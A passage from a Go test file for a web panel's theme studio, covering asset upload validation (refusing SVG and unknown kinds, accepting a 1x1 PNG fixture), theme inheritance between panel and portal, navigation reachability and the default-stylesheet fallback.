		t.Fatalf("an SVG upload: status %d, want 415 (body %s)", rec.Code, rec.Body)
	}
	// An unknown role is refused.
	rec = env.upload(t, cookie, csrf, "logo", "image/png", []byte("\x89PNG\r\n\x1a\n"))
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("an unknown asset kind: status %d, want 400 (body %s)", rec.Code, rec.Body)
	}

	// A real 1x1 PNG is accepted and comes back with a usable reference.
	png := decodePNG(t)
	rec = env.upload(t, cookie, csrf, "background", "image/png", png)
	if rec.Code != http.StatusCreated {
		t.Fatalf("a real PNG: status %d (body %s)", rec.Code, rec.Body)
	}
	var stored struct {
		ID     string `json:"id"`
		URL    string `json:"url"`
		Ref    string `json:"ref"`
		Width  *int   `json:"width"`
		Height *int   `json:"height"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &stored); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if stored.Ref != theme.AssetRef(stored.ID) {
		t.Errorf("ref = %q, want %q", stored.Ref, theme.AssetRef(stored.ID))
	}
	if stored.Width == nil || *stored.Width != 1 || stored.Height == nil || *stored.Height != 1 {
		t.Errorf("the dimensions were not read: %v x %v", stored.Width, stored.Height)
	}

	// The asset is served with its stored type and an immutable policy.
	served := env.get(t, stored.URL, nil)
	if served.Code != http.StatusOK {
		t.Fatalf("GET %s: status %d", stored.URL, served.Code)
	}
	if got := served.Header().Get("Content-Type"); got != "image/png" {
		t.Errorf("Content-Type = %q", got)
	}
	if got := served.Header().Get("Cache-Control"); !strings.Contains(got, "immutable") {
		t.Errorf("Cache-Control = %q", got)
	}

	// Deleting it works while nothing references it.
	if rec := env.mutation(t, http.MethodDelete,
		"/api/v1/staff/theme/assets/"+stored.ID, cookie, csrf, nil); rec.Code != http.StatusOK {
		t.Fatalf("delete an unused asset: status %d (body %s)", rec.Code, rec.Body)
	}
}

// upload issues a raw-body asset upload.
func (e *themeEnv) upload(t *testing.T, cookie *http.Cookie, csrf, kind, contentType string, body []byte) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest(http.MethodPost,
		"/api/v1/staff/theme/assets?kind="+kind, bytes.NewReader(body))
	req.Header.Set("Content-Type", contentType)
	req.Header.Set("X-CSRF-Token", csrf)
	req.Header.Set("Idempotency-Key", newIdempotencyKey())
	req.AddCookie(cookie)
	rec := httptest.NewRecorder()
	e.srv.Handler().ServeHTTP(rec, req)
	return rec
}

// decodePNG returns the smallest valid PNG: a single transparent pixel.
//
// It is written out rather than generated so the test does not need an encoder: the point is that
// the *decoder* in the handler accepts a real file, and a fixture is the most direct way to say that.
func decodePNG(t *testing.T) []byte {
	t.Helper()
	const encoded = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=="
	out, err := base64Decode(encoded)
	if err != nil {
		t.Fatalf("decode the PNG fixture: %v", err)
	}
	return out
}

// ---------------------------------------------------------------- inheritance --

// A portal draft inherits the published panel theme, and can opt out.
//
// The inheritance rule is the reason a portal theme does not have to restate the panel's palette,
// and the reason it must be possible to say "no, start from the built-in default".
func TestPortalInheritsThePanelUntilItOptsOut(t *testing.T) {
	env := newThemeEnv(t)
	cookie, csrf := env.admin(t)

	// Publish a panel theme with a distinctive radius.
	panelID := env.createDraft(t, cookie, csrf, "panel", map[string]string{"preset": "brutalist"})
	if rec := env.mutation(t, http.MethodPost,
		"/api/v1/staff/theme/revisions/"+panelID+"/publish", cookie, csrf, nil); rec.Code != http.StatusOK {
		t.Fatalf("publish the panel: %d", rec.Code)
	}

	// A portal draft that changes only its accent inherits the panel's square corners.
	portalDoc := theme.Document{
		Schema: theme.SchemaVersion,
		ID:     "portal-inherits",
		Name:   "Portal inherits",
		Color: theme.Color{
			Brand: theme.BrandPalette{Primary: "#7c3aed"},
		},
	}
	id := env.createDraft(t, cookie, csrf, "portal", map[string]any{"document": portalDoc})
	rec := env.get(t, "/api/v1/staff/theme/portal", cookie)
	var body struct {
		Drafts []struct {
			ID       string         `json:"id"`
			Document theme.Document `json:"document"`
		} `json:"drafts"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &body); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if len(body.Drafts) != 1 || body.Drafts[0].ID != id {
		t.Fatalf("the portal draft is not the one that was created: %s", rec.Body)
	}
	if got := body.Drafts[0].Document.Shape.Radius.MD; got != "0px" {
		t.Errorf("the portal inherited radius.md %q, want the panel's 0px", got)
	}
	if got := body.Drafts[0].Document.AccentFor("dark"); got != "#7c3aed" {
		t.Errorf("the portal's accent is %q, want its own #7c3aed", got)
	}

	// Opting out starts from the built-in default, so the corners come back.
	noInherit := false
	portalDoc.ID = "portal-opt-out"
	portalDoc.Name = "Portal opt out"
	portalDoc.Inherit = &noInherit
	env.createDraft(t, cookie, csrf, "portal", map[string]any{"document": portalDoc})

	rec = env.get(t, "/api/v1/staff/theme/portal", cookie)
	if err := json.Unmarshal(rec.Body.Bytes(), &body); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if got := body.Drafts[0].Document.Shape.Radius.MD; got != "4px" {
		t.Errorf("an opted-out portal has radius.md %q, want the built-in 4px", got)
	}
}

// --------------------------------------------------------------------- nav --

// The studio is reachable from the panel's own navigation.
//
// A screen nothing links to is a screen an operator never finds, and no per-screen test notices.
func TestTheStudioIsLinkedFromTheNavigation(t *testing.T) {
	env := newThemeEnv(t)
	cookie, _ := env.admin(t)

	rec := env.get(t, "/", cookie)
	body := rec.Body.String()
	// The nav is rendered client-side from ui/layout.ts, so the shell only has to prove it serves the
	// bundle that contains the link; the link itself is asserted in the frontend suite.
	if !strings.Contains(body, "/assets/app.") {
		t.Fatalf("the shell does not reference the bundle: %s", body[:min(400, len(body))])
	}
	// And the permission the nav entry is gated on exists.
	if rec := env.get(t, "/api/v1/staff/theme", cookie); rec.Code != http.StatusOK {
		t.Fatalf("an administrator cannot read the studio: %d", rec.Code)
	}
}

// min is the integer minimum, for a bounded slice of a long body.
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// The theme cache falls back to the built-in default rather than failing a request.
//
// A colour problem must never be able to take the panel down: an installation with no published
// theme — which is every fresh one — has to render the product's own appearance, not an error page.
// This is asserted through the same server the other tests use, before anything is published, so it
// covers the real handler rather than a stub.
func TestTheShellRendersWithNoPublishedTheme(t *testing.T) {
	env := newThemeEnv(t)

	rec := env.get(t, "/", nil)
	if rec.Code != http.StatusOK {
		t.Fatalf("status %d (body %s)", rec.Code, rec.Body)
	}
	if !strings.Contains(rec.Body.String(), "/theme/r/default/theme.css") {
		t.Error("the shell does not link the built-in default stylesheet")
	}
	// And the default stylesheet is served, so the page is actually styled rather than merely linked.
	sheet := env.get(t, "/theme/r/default/theme.css", nil)
	if sheet.Code != http.StatusOK {
		t.Fatalf("GET the default stylesheet: status %d", sheet.Code)
	}
	if !strings.Contains(sheet.Body.String(), "--color-bg: #171413") {
		t.Error("the default stylesheet does not carry the built-in palette")
	}
}

// -------------------------------------------------------------------- helpers --

// newIdempotencyKey returns a fresh key for a staff mutation.
//
// A real client reuses one across a retry; a test never retries, so a fresh key per call is the
// honest thing — it must not be deduplicated against an earlier request in the same test.
func newIdempotencyKey() string {
	var b [16]byte
	if _, err := rand.Read(b[:]); err != nil {
		return "00000000-0000-4000-8000-000000000000"
	}
	// Format as a uuid v4 so the middleware's shape check accepts it.
	b[6] = (b[6] & 0x0f) | 0x40
	b[8] = (b[8] & 0x3f) | 0x80
	const digits = "0123456789abcdef"
	out := make([]byte, 0, 36)
	for i, v := range b {
		if i == 4 || i == 6 || i == 8 || i == 10 {
			out = append(out, '-')
		}
		out = append(out, digits[v>>4], digits[v&0x0f])
	}
	return string(out)
}

// base64Decode decodes the PNG fixture.
func base64Decode(s string) ([]byte, error) { return base64.StdEncoding.DecodeString(s) }
